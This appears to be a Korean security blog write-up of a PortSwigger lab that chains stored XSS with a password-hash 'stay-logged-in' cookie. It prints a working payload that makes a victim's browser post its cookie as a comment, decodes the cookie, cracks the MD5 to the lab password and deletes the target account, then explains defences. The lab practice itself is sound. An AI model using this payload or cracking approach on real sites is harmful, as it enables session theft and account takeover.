+++
date = '2026-08-06T18:00:00+09:00'
draft = false
title = '[Write-up] PortSwigger - Offline password cracking'
summary = "댓글 XSS로 피해자의 stay-logged-in 쿠키를 탈취하고, 쿠키에 담긴 MD5 해시를 오프라인 크랙해 평문 비밀번호를 복원한 뒤 계정을 삭제하는 Authentication 풀이"
toc = true
tags = ["Authentication", "Session Management", "XSS", "Password Cracking", "PortSwigger", "Practitioner"]
+++

---

## 문제 분석

> **난이도**: `PRACTITIONER`  
> **Lab**: [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

> ![image.png](/writeup/portswigger/authentication/10/1.png)

이 랩은 비밀번호 해시를 쿠키에 저장하며, 댓글 기능에 XSS 취약점이 있다. 이를 엮어 `carlos`의 `stay-logged-in` 쿠키를 탈취하고, 해시를 크랙해 비밀번호를 알아낸 뒤 로그인해 계정을 삭제하면 문제가 해결된다. 실습 계정은 `wiener:peter`, 대상 계정은 `carlos`다.

### Authentication 진단

Stay logged in을 체크하고 로그인하면 다음 쿠키가 설정된다.

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
Set-Cookie: stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw; Expires=Wed, 01 Jan 3000 01:00:00 UTC
Set-Cookie: session=cfr49BFDCXBYNlJMwKZHlbGj1rczuoaE; Secure; HttpOnly; SameSite=None
Content-Length: 0
```

`stay-logged-in` 값은 [stay-logged-in cookie](/write-up/portswigger/authentication/write-up-portswigger---brute-forcing-a-stay-logged-in-cookie/) 랩과 동일하게 `base64(username:md5(password))` 구조다. 다만 여기서 `stay-logged-in` 쿠키에는 `HttpOnly`가 없어 **자바스크립트로 읽을 수 있다** — XSS로 탈취할 여지가 생긴다.

### XSS 진단

댓글 기능에 XSS가 있다 했으니 기본 페이로드로 확인한다.

```html
<script>alert(1)</script>
```

댓글 본문에 입력하면 스크립트가 실행된다. 저장형 XSS가 성립한다.

---

## 익스플로잇

댓글을 여는 피해자의 `document.cookie`를 다시 댓글로 자동 작성하게 만드는 페이로드를 구성한다.

```html
<script>
	document.addEventListener('DOMContentLoaded', () => {
		const form = document.forms[0];
		form.elements['comment'].value = 'cookie : '+ document.cookie;
		form.elements['name'].value = 'victim';
		form.elements['email'].value = 'xss@example.com';
		form.elements['website'].value = 'http:xss';
		form.submit();
	});
</script>
```

DOM 구조상 `form`이 `script`보다 뒤에 오므로, `DOMContentLoaded` 이후 실행되도록 감싸 폼 요소가 존재하는 시점에 접근하게 한다. 이 페이로드를 댓글로 저장하고 피해자가 열면, 피해자의 쿠키가 새 댓글로 게시된다.

![image.png](/writeup/portswigger/authentication/10/2.png)

얻은 `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`를 base64 디코딩하면 `carlos:26323c16d5f4dabff3bb136f2460a943`가 나온다. 뒤의 MD5 해시를 오프라인 크랙(레인보우 테이블·사전 대입)하면 평문 `onceuponatime`이 나온다.

![image.png](/writeup/portswigger/authentication/10/3.png)

`carlos:onceuponatime`으로 로그인해 계정을 삭제하면 문제가 해결된다.

![image.png](/writeup/portswigger/authentication/10/4.png)

---

## 정리

이 랩은 두 취약점을 사슬로 엮는다. 개별로는 XSS(쿠키 탈취)와 취약한 세션 토큰 설계(해시 저장)이지만, 결합되면 피해자의 상호작용만으로 평문 비밀번호가 통째로 넘어간다. [stay-logged-in cookie](/write-up/portswigger/authentication/write-up-portswigger---brute-forcing-a-stay-logged-in-cookie/) 랩이 쿠키를 **서버에 던져** 맞히는 온라인 브루트포스였다면, 이 랩은 쿠키를 **손에 넣은 뒤** 오프라인에서 해시를 되돌린다는 점이 다르다. 온라인 브루트포스는 rate limit에 걸리지만, 오프라인 크랙은 공격자 장비에서 무제한으로 돌아간다.

결함의 뿌리는 **비밀번호에서 유도한 값을 클라이언트에 노출**한 것이다. 솔트 없는 MD5는 GPU로 초당 수십억 회 계산되고 레인보우 테이블도 방대해, 짧거나 흔한 비밀번호는 사실상 즉시 복원된다. 세션 토큰에 비밀번호 해시를 담는 설계 자체가 잘못이며, `HttpOnly` 누락이 XSS 탈취를 가능케 해 사슬을 완성했다.

방어는 세 지점에서 끊을 수 있다. 세션 토큰을 자격증명과 무관한 난수로 발급하고, 쿠키에 `HttpOnly`를 걸어 스크립트 접근을 차단하며, 댓글 입력을 적절히 인코딩·필터링해 XSS를 없앤다. 어느 하나만 제대로 됐어도 이 사슬은 성립하지 않는다. XSS로 세션·자격증명을 탈취하는 계열은 [XSS Playbook](/playbook/playbook-xss-%EC%A7%84%EB%8B%A8-cheat-sheet/)에 정리했다.
